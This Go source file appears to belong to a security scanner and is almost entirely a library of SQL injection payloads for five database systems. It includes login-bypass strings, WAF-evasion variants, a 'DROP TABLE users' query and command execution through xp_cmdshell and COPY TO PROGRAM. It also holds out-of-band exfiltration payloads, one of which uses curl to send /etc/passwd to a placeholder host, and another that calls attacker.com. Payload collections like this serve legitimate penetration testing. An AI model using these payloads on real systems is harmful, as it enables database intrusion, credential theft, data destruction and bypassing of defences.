// Package sqli provides SQL injection payloads for various database systems.
// Payloads are categorized by:
//   - Database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
//   - Injection technique (Union, Error-based, Blind, Time-based, Stacked)
//   - Context (String, Integer, Comment)
package sqli

// DBType represents a database type.
type DBType string

const (
	MySQL      DBType = "mysql"
	PostgreSQL DBType = "postgresql"
	MSSQL      DBType = "mssql"
	Oracle     DBType = "oracle"
	SQLite     DBType = "sqlite"
	Generic    DBType = "generic"
)

// Technique represents an injection technique.
type Technique string

const (
	TechUnion     Technique = "union"
	TechError     Technique = "error"
	TechBlind     Technique = "blind"
	TechTimeBased Technique = "time"
	TechStacked   Technique = "stacked"
)

// Payload represents a SQL injection payload.
type Payload struct {
	Value       string
	Technique   Technique
	DBType      DBType
	Description string
	WAFBypass   bool // Payload includes WAF evasion
}

// GetPayloads returns payloads for a specific database type.
func GetPayloads(dbType DBType) []Payload {
	switch dbType {
	case MySQL:
		return mysqlPayloads
	case PostgreSQL:
		return postgresPayloads
	case MSSQL:
		return mssqlPayloads
	case Oracle:
		return oraclePayloads
	case SQLite:
		return sqlitePayloads
	default:
		return genericPayloads
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(dbType DBType, technique Technique) []Payload {
	all := GetPayloads(dbType)
	var result []Payload
	for _, p := range all {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads(dbType DBType) []Payload {
	all := GetPayloads(dbType)
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAuthBypassPayloads returns authentication bypass payloads.
func GetAuthBypassPayloads() []Payload {
	return authBypassPayloads
}

// GetAllPayloads returns all payloads for all database types.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, genericPayloads...)
	all = append(all, mysqlPayloads...)
	all = append(all, postgresPayloads...)
	all = append(all, mssqlPayloads...)
	all = append(all, oraclePayloads...)
	all = append(all, sqlitePayloads...)
	all = append(all, advancedWAFBypassPayloads...)
	all = append(all, oastExfilPayloads...)
	return all
}

// Generic payloads that work across multiple databases.
// Source: PayloadsAllTheThings, HackTricks
var genericPayloads = []Payload{
	// Basic detection
	{Value: "'", Technique: TechError, DBType: Generic, Description: "Single quote error test"},
	{Value: "\"", Technique: TechError, DBType: Generic, Description: "Double quote error test"},
	{Value: "`", Technique: TechError, DBType: Generic, Description: "Backtick error test"},
	{Value: "' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Basic OR bypass"},
	{Value: "' OR '1'='1' --", Technique: TechBlind, DBType: Generic, Description: "OR bypass with comment"},
	{Value: "' OR '1'='1' #", Technique: TechBlind, DBType: Generic, Description: "OR bypass with hash comment"},
	{Value: "' OR 1=1 --", Technique: TechBlind, DBType: Generic, Description: "Numeric OR bypass"},
	{Value: "1' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Prefix 1 OR bypass"},
	{Value: "1 OR 1=1", Technique: TechBlind, DBType: Generic, Description: "Integer OR bypass"},
	{Value: "1' OR 1=1 --", Technique: TechBlind, DBType: Generic, Description: "Integer context OR"},
	{Value: "') OR ('1'='1", Technique: TechBlind, DBType: Generic, Description: "Parenthesis bypass"},
	{Value: "')) OR (('1'='1", Technique: TechBlind, DBType: Generic, Description: "Double parenthesis bypass"},
	{Value: "' AND '1'='1", Technique: TechBlind, DBType: Generic, Description: "AND true test"},
	{Value: "' AND '1'='2", Technique: TechBlind, DBType: Generic, Description: "AND false test"},
	{Value: "1 AND 1=1", Technique: TechBlind, DBType: Generic, Description: "Integer AND true"},
	{Value: "1 AND 1=2", Technique: TechBlind, DBType: Generic, Description: "Integer AND false"},

	// WAF bypass variants
	{Value: "' oR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Case variation bypass", WAFBypass: true},
	{Value: "' OR/**/'1'='1", Technique: TechBlind, DBType: Generic, Description: "Comment bypass", WAFBypass: true},
	{Value: "' OR%20'1'='1", Technique: TechBlind, DBType: Generic, Description: "URL encoded space", WAFBypass: true},
	{Value: "' OR%0A'1'='1", Technique: TechBlind, DBType: Generic, Description: "Newline bypass", WAFBypass: true},
	{Value: "'/**/OR/**/'1'='1", Technique: TechBlind, DBType: Generic, Description: "Multi-comment bypass", WAFBypass: true},
	{Value: "' OR 0x31=0x31", Technique: TechBlind, DBType: Generic, Description: "Hex encoding bypass", WAFBypass: true},
	{Value: "'+OR+'1'='1", Technique: TechBlind, DBType: Generic, Description: "Plus concat bypass", WAFBypass: true},
}

// MySQL-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var mysqlPayloads = []Payload{
	// Union-based
	{Value: "' UNION SELECT NULL--", Technique: TechUnion, DBType: MySQL, Description: "Union single column"},
	{Value: "' UNION SELECT NULL,NULL--", Technique: TechUnion, DBType: MySQL, Description: "Union two columns"},
	{Value: "' UNION SELECT NULL,NULL,NULL--", Technique: TechUnion, DBType: MySQL, Description: "Union three columns"},
	{Value: "' UNION SELECT @@version,NULL,NULL--", Technique: TechUnion, DBType: MySQL, Description: "Extract MySQL version"},
	{Value: "' UNION SELECT user(),NULL--", Technique: TechUnion, DBType: MySQL, Description: "Extract current user"},
	{Value: "' UNION SELECT database(),NULL--", Technique: TechUnion, DBType: MySQL, Description: "Extract database name"},
	{Value: "' UNION SELECT table_name,NULL FROM information_schema.tables--", Technique: TechUnion, DBType: MySQL, Description: "List tables"},
	{Value: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", Technique: TechUnion, DBType: MySQL, Description: "List columns"},

	// Error-based
	{Value: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", Technique: TechError, DBType: MySQL, Description: "Error-based version extraction"},
	{Value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--", Technique: TechError, DBType: MySQL, Description: "ExtractValue error"},
	{Value: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--", Technique: TechError, DBType: MySQL, Description: "UpdateXML error"},
	{Value: "' AND EXP(~(SELECT * FROM(SELECT user())a))--", Technique: TechError, DBType: MySQL, Description: "EXP overflow error"},

	// Time-based blind
	{Value: "' AND SLEEP(5)--", Technique: TechTimeBased, DBType: MySQL, Description: "Basic sleep"},
	{Value: "' AND IF(1=1,SLEEP(5),0)--", Technique: TechTimeBased, DBType: MySQL, Description: "Conditional sleep"},
	{Value: "' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--", Technique: TechTimeBased, DBType: MySQL, Description: "Subquery sleep"},
	{Value: "1' AND SLEEP(5)#", Technique: TechTimeBased, DBType: MySQL, Description: "Integer context sleep"},
	{Value: "' OR SLEEP(5)--", Technique: TechTimeBased, DBType: MySQL, Description: "OR sleep"},
	{Value: "' AND BENCHMARK(5000000,SHA1('test'))--", Technique: TechTimeBased, DBType: MySQL, Description: "Benchmark delay"},

	// Stacked queries
	{Value: "'; SELECT SLEEP(5)--", Technique: TechStacked, DBType: MySQL, Description: "Stacked sleep"},
	{Value: "'; DROP TABLE users--", Technique: TechStacked, DBType: MySQL, Description: "Stacked drop (dangerous)"},

	// WAF bypass MySQL-specific
	{Value: "' /*!50000UNION*/ SELECT NULL--", Technique: TechUnion, DBType: MySQL, Description: "Version comment bypass", WAFBypass: true},
	{Value: "' UNION/*!*/SELECT NULL--", Technique: TechUnion, DBType: MySQL, Description: "Inline comment bypass", WAFBypass: true},
	{Value: "' UN/**/ION SEL/**/ECT NULL--", Technique: TechUnion, DBType: MySQL, Description: "Split keyword bypass", WAFBypass: true},
	{Value: "' %55NION %53ELECT NULL--", Technique: TechUnion, DBType: MySQL, Description: "Hex keyword bypass", WAFBypass: true},
	{Value: "' uNiOn SeLeCt NULL--", Technique: TechUnion, DBType: MySQL, Description: "Case mixing bypass", WAFBypass: true},
	{Value: "-1' UNION SELECT 1,2,3--", Technique: TechUnion, DBType: MySQL, Description: "Negative ID union"},
	{Value: "' AND SLEEP/**/(5)--", Technique: TechTimeBased, DBType: MySQL, Description: "Comment in function", WAFBypass: true},
}

// PostgreSQL-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var postgresPayloads = []Payload{
	// Union-based
	{Value: "' UNION SELECT NULL--", Technique: TechUnion, DBType: PostgreSQL, Description: "Union single column"},
	{Value: "' UNION SELECT version()--", Technique: TechUnion, DBType: PostgreSQL, Description: "Extract Postgres version"},
	{Value: "' UNION SELECT current_user--", Technique: TechUnion, DBType: PostgreSQL, Description: "Extract current user"},
	{Value: "' UNION SELECT current_database()--", Technique: TechUnion, DBType: PostgreSQL, Description: "Extract database name"},
	{Value: "' UNION SELECT table_name FROM information_schema.tables--", Technique: TechUnion, DBType: PostgreSQL, Description: "List tables"},

	// Error-based
	{Value: "' AND 1=CAST((SELECT version()) AS int)--", Technique: TechError, DBType: PostgreSQL, Description: "Cast error version"},
	{Value: "' AND 1=CAST((SELECT current_user) AS int)--", Technique: TechError, DBType: PostgreSQL, Description: "Cast error user"},

	// Time-based blind
	{Value: "' AND pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "pg_sleep delay"},
	{Value: "'; SELECT pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Stacked pg_sleep"},
	{Value: "' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Conditional pg_sleep"},

	// Stacked queries (PostgreSQL supports these)
	{Value: "'; SELECT version()--", Technique: TechStacked, DBType: PostgreSQL, Description: "Stacked version"},
	{Value: "'; CREATE TABLE test(id int)--", Technique: TechStacked, DBType: PostgreSQL, Description: "Stacked create table"},

	// Command execution
	{Value: "'; COPY (SELECT '') TO PROGRAM 'id'--", Technique: TechStacked, DBType: PostgreSQL, Description: "COPY command execution"},
}

// MSSQL-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var mssqlPayloads = []Payload{
	// Union-based
	{Value: "' UNION SELECT NULL--", Technique: TechUnion, DBType: MSSQL, Description: "Union single column"},
	{Value: "' UNION SELECT @@version--", Technique: TechUnion, DBType: MSSQL, Description: "Extract MSSQL version"},
	{Value: "' UNION SELECT user_name()--", Technique: TechUnion, DBType: MSSQL, Description: "Extract current user"},
	{Value: "' UNION SELECT db_name()--", Technique: TechUnion, DBType: MSSQL, Description: "Extract database name"},
	{Value: "' UNION SELECT name FROM sysobjects WHERE xtype='U'--", Technique: TechUnion, DBType: MSSQL, Description: "List tables"},

	// Error-based
	{Value: "' AND 1=CONVERT(int,@@version)--", Technique: TechError, DBType: MSSQL, Description: "Convert error version"},
	{Value: "' AND 1=CONVERT(int,user_name())--", Technique: TechError, DBType: MSSQL, Description: "Convert error user"},

	// Time-based blind
	{Value: "'; WAITFOR DELAY '0:0:5'--", Technique: TechTimeBased, DBType: MSSQL, Description: "WAITFOR delay"},
	{Value: "' IF (1=1) WAITFOR DELAY '0:0:5'--", Technique: TechTimeBased, DBType: MSSQL, Description: "Conditional WAITFOR"},

	// Stacked queries
	{Value: "'; EXEC xp_cmdshell 'whoami'--", Technique: TechStacked, DBType: MSSQL, Description: "xp_cmdshell execution"},
	{Value: "'; EXEC sp_configure 'show advanced options',1--", Technique: TechStacked, DBType: MSSQL, Description: "Enable advanced options"},

	// WAF bypass
	{Value: "' UNION%0ASELECT NULL--", Technique: TechUnion, DBType: MSSQL, Description: "Newline bypass", WAFBypass: true},
	{Value: "' UNION%09SELECT NULL--", Technique: TechUnion, DBType: MSSQL, Description: "Tab bypass", WAFBypass: true},
}

// Oracle-specific payloads.
// Source: PayloadsAllTheThings, HackTricks
var oraclePayloads = []Payload{
	// Union-based
	{Value: "' UNION SELECT NULL FROM dual--", Technique: TechUnion, DBType: Oracle, Description: "Union single column"},
	{Value: "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--", Technique: TechUnion, DBType: Oracle, Description: "Extract Oracle version"},
	{Value: "' UNION SELECT user FROM dual--", Technique: TechUnion, DBType: Oracle, Description: "Extract current user"},
	{Value: "' UNION SELECT table_name FROM all_tables--", Technique: TechUnion, DBType: Oracle, Description: "List tables"},

	// Error-based
	{Value: "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--", Technique: TechError, DBType: Oracle, Description: "CTX error"},
	{Value: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", Technique: TechError, DBType: Oracle, Description: "UTL_INADDR error"},

	// Time-based blind
	{Value: "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", Technique: TechTimeBased, DBType: Oracle, Description: "DBMS_PIPE delay"},
	{Value: "' AND 1=DBMS_LOCK.SLEEP(5)--", Technique: TechTimeBased, DBType: Oracle, Description: "DBMS_LOCK sleep"},

	// Out-of-band
	{Value: "' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))=1--", Technique: TechBlind, DBType: Oracle, Description: "UTL_HTTP OOB"},
}

// SQLite-specific payloads.
// Source: PayloadsAllTheThings
var sqlitePayloads = []Payload{
	// Union-based
	{Value: "' UNION SELECT NULL--", Technique: TechUnion, DBType: SQLite, Description: "Union single column"},
	{Value: "' UNION SELECT sqlite_version()--", Technique: TechUnion, DBType: SQLite, Description: "Extract SQLite version"},
	{Value: "' UNION SELECT name FROM sqlite_master WHERE type='table'--", Technique: TechUnion, DBType: SQLite, Description: "List tables"},
	{Value: "' UNION SELECT sql FROM sqlite_master--", Technique: TechUnion, DBType: SQLite, Description: "Extract schema"},

	// Boolean-based blind
	{Value: "' AND 1=1--", Technique: TechBlind, DBType: SQLite, Description: "Boolean true"},
	{Value: "' AND 1=2--", Technique: TechBlind, DBType: SQLite, Description: "Boolean false"},
	{Value: "' AND SUBSTR((SELECT name FROM sqlite_master LIMIT 1),1,1)='a'--", Technique: TechBlind, DBType: SQLite, Description: "Character extraction"},

	// Time-based (SQLite has no sleep, uses heavy operations)
	{Value: "' AND (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2)--", Technique: TechTimeBased, DBType: SQLite, Description: "Heavy query delay"},
}

// Authentication bypass payloads.
// Source: PayloadsAllTheThings, HackTricks
var authBypassPayloads = []Payload{
	{Value: "admin'--", Technique: TechBlind, DBType: Generic, Description: "Admin with comment"},
	{Value: "admin'#", Technique: TechBlind, DBType: Generic, Description: "Admin with hash comment"},
	{Value: "admin'/*", Technique: TechBlind, DBType: Generic, Description: "Admin with block comment"},
	{Value: "' OR 1=1--", Technique: TechBlind, DBType: Generic, Description: "Classic OR bypass"},
	{Value: "' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "String OR bypass"},
	{Value: "' OR '1'='1'--", Technique: TechBlind, DBType: Generic, Description: "String OR with comment"},
	{Value: "' OR '1'='1'/*", Technique: TechBlind, DBType: Generic, Description: "String OR with block comment"},
	{Value: "' OR 1=1#", Technique: TechBlind, DBType: Generic, Description: "OR bypass MySQL"},
	{Value: "admin' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Admin OR bypass"},
	{Value: "admin' OR '1'='1'--", Technique: TechBlind, DBType: Generic, Description: "Admin OR with comment"},
	{Value: "admin' OR '1'='1'#", Technique: TechBlind, DBType: Generic, Description: "Admin OR MySQL"},
	{Value: "admin'--' AND ''='", Technique: TechBlind, DBType: Generic, Description: "Admin double bypass"},
	{Value: "' OR ''='", Technique: TechBlind, DBType: Generic, Description: "Empty string bypass"},
	{Value: "' OR 1=1 LIMIT 1--", Technique: TechBlind, DBType: Generic, Description: "OR with LIMIT"},
	{Value: "1' OR '1'='1' LIMIT 1--", Technique: TechBlind, DBType: Generic, Description: "Numeric OR with LIMIT"},
	{Value: "'-'", Technique: TechBlind, DBType: Generic, Description: "Arithmetic bypass"},
	{Value: "' or 1=1 or ''='", Technique: TechBlind, DBType: Generic, Description: "Double OR bypass"},
	{Value: "') OR ('1'='1", Technique: TechBlind, DBType: Generic, Description: "Parenthesis OR bypass"},
	{Value: "')) OR (('1'='1", Technique: TechBlind, DBType: Generic, Description: "Double parenthesis OR"},
	{Value: "admin')--", Technique: TechBlind, DBType: Generic, Description: "Admin close paren"},
	{Value: "' UNION SELECT 1,'admin','password'--", Technique: TechUnion, DBType: Generic, Description: "Union inject credentials"},
}

// advancedWAFBypassPayloads bundles WAF / IDS evasion variants that
// build on the per-dialect entries above. Sourced from
// PayloadsAllTheThings's "WAF Bypass" and HackTricks's "SQL Injection
// Filter Bypass" pages.
var advancedWAFBypassPayloads = []Payload{
	// Generic whitespace + comment obfuscation
	{Value: "'%09OR%091=1--", Technique: TechBlind, DBType: Generic, Description: "Tab as space (WAF whitespace rule)", WAFBypass: true},
	{Value: "'%0AOR%0A1=1--", Technique: TechBlind, DBType: Generic, Description: "Newline as space", WAFBypass: true},
	{Value: "'%0DOR%0D1=1--", Technique: TechBlind, DBType: Generic, Description: "Carriage return as space", WAFBypass: true},
	{Value: "'/*!50000OR*/1=1--", Technique: TechBlind, DBType: MySQL, Description: "Versioned comment OR", WAFBypass: true},
	{Value: "'/*!50000UnIoN*//*!50000SeLeCt*/1--", Technique: TechUnion, DBType: MySQL, Description: "Versioned comment + case", WAFBypass: true},
	{Value: "/**//*!12345UNION SELECT*//**/1,2,3", Technique: TechUnion, DBType: MySQL, Description: "Versioned UNION", WAFBypass: true},

	// Logic operator alternatives
	{Value: "' || '1'='1", Technique: TechBlind, DBType: Generic, Description: "|| as OR (PostgreSQL/Oracle)", WAFBypass: true},
	{Value: "' && 1=1--", Technique: TechBlind, DBType: Generic, Description: "&& as AND (MySQL bitwise context)", WAFBypass: true},
	{Value: "' XOR 1--", Technique: TechBlind, DBType: MySQL, Description: "XOR truthy", WAFBypass: true},

	// Function-name obfuscation (where=column-context rewrites)
	{Value: "' AND (SELECT 1)=1--", Technique: TechBlind, DBType: Generic, Description: "Subquery wrap (escapes AND-OR filter)", WAFBypass: true},
	{Value: "' AND ascii(substr(database(),1,1))>0--", Technique: TechBlind, DBType: MySQL, Description: "Char-by-char ascii blind", WAFBypass: true},
	{Value: "' AND (SELECT(LENGTH(database())))>0--", Technique: TechBlind, DBType: MySQL, Description: "Length-of subquery"},

	// Heredoc / quoted-identifier
	{Value: "' UNION SELECT @@version-- -", Technique: TechUnion, DBType: MySQL, Description: "Comment-then-space terminator (MySQL --)", WAFBypass: true},
	{Value: "' UNION SELECT NULL--%00", Technique: TechUnion, DBType: Generic, Description: "Null-byte after comment", WAFBypass: true},

	// Encoding tricks
	{Value: "' OR 1=1 LIMIT 1 OFFSET 0--", Technique: TechBlind, DBType: Generic, Description: "LIMIT OFFSET pad (avoids 'AND 0=0' rule)"},
	{Value: "' OR 1=1 ORDER BY 1--", Technique: TechBlind, DBType: Generic, Description: "ORDER BY tail", WAFBypass: true},
	{Value: "' OR 1=1 GROUP BY 1--", Technique: TechBlind, DBType: Generic, Description: "GROUP BY tail", WAFBypass: true},
	{Value: "' OR EXISTS(SELECT 1)--", Technique: TechBlind, DBType: Generic, Description: "EXISTS(SELECT) tautology", WAFBypass: true},
	{Value: "'+CONCAT(0x27,0x6f,0x72,0x27)+'1'='1", Technique: TechBlind, DBType: MySQL, Description: "CONCAT(0x...) keyword reconstruction", WAFBypass: true},

	// Quote terminator alternatives
	{Value: "%00' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Null-byte prefix", WAFBypass: true},
	{Value: "\\' OR '1'='1' /*", Technique: TechBlind, DBType: Generic, Description: "Backslash-escape probe", WAFBypass: true},
	{Value: "\xc2\xa7 OR 1=1--", Technique: TechBlind, DBType: Generic, Description: "UTF-8 BOM-like prefix (some WAFs strip)", WAFBypass: true},

	// Dialect-specific time-based with hostile chars
	{Value: "1');WAITFOR DELAY '0:0:5'--", Technique: TechTimeBased, DBType: MSSQL, Description: "MSSQL WAITFOR with stacked", WAFBypass: true},
	{Value: "1' AND 0=BENCHMARK(20000000,SHA1('a'))--", Technique: TechTimeBased, DBType: MySQL, Description: "Benchmark heavy delay", WAFBypass: true},
	{Value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))y)--", Technique: TechTimeBased, DBType: MySQL, Description: "Triple subquery sleep (case-sensitive WAF bypass)", WAFBypass: true},
	{Value: "1; SELECT pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Stacked pg_sleep", WAFBypass: true},
	{Value: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Technique: TechTimeBased, DBType: Oracle, Description: "Oracle DBMS_PIPE.RECEIVE_MESSAGE sleep", WAFBypass: true},
}

// oastExfilPayloads exfiltrate query results out-of-band via DNS or
// HTTP — useful when the response surface is fully blind. Each carries
// {OAST_HOST} as a placeholder the detector substitutes with the
// interactsh / Burp Collaborator host before sending.
var oastExfilPayloads = []Payload{
	// MySQL — LOAD_FILE + UDF (no UDF needed for simple DNS via path)
	{Value: "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{OAST_HOST}\\\\test.txt'))--", Technique: TechBlind, DBType: MySQL, Description: "MySQL LOAD_FILE UNC DNS exfil"},

	// PostgreSQL — COPY ... PROGRAM or COPY ... FROM (RCE on superuser)
	{Value: "'; COPY (SELECT version()) TO PROGRAM 'curl http://{OAST_HOST}/?v=$(cat /etc/passwd|base64)'--", Technique: TechStacked, DBType: PostgreSQL, Description: "Postgres COPY TO PROGRAM exfil (requires superuser)"},
	{Value: "'; SELECT pg_read_file('/etc/passwd')--", Technique: TechStacked, DBType: PostgreSQL, Description: "Postgres pg_read_file (file read)"},

	// MSSQL — xp_dirtree (UNC path triggers SMB → DNS resolves OAST)
	{Value: "'; EXEC master..xp_dirtree '\\\\{OAST_HOST}\\share'--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL xp_dirtree DNS exfil"},
	{Value: "'; EXEC master..xp_cmdshell 'nslookup {OAST_HOST}'--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL xp_cmdshell nslookup (requires sysadmin)"},
	{Value: "'; DECLARE @v VARCHAR(8000); SELECT @v=(SELECT @@version); EXEC('master..xp_dirtree ''\\\\'+@v+'.{OAST_HOST}\\\\test'';')--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL OAST with embedded version"},

	// Oracle — UTL_HTTP / UTL_INADDR / DBMS_LDAP for DNS exfil
	{Value: "'||(SELECT UTL_HTTP.REQUEST('http://{OAST_HOST}/?v='||(SELECT user FROM dual)) FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle UTL_HTTP exfil"},
	{Value: "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OAST_HOST}') FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle UTL_INADDR DNS exfil"},
	{Value: "'||(SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.{OAST_HOST}',80) FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle DBMS_LDAP DNS exfil"},
}
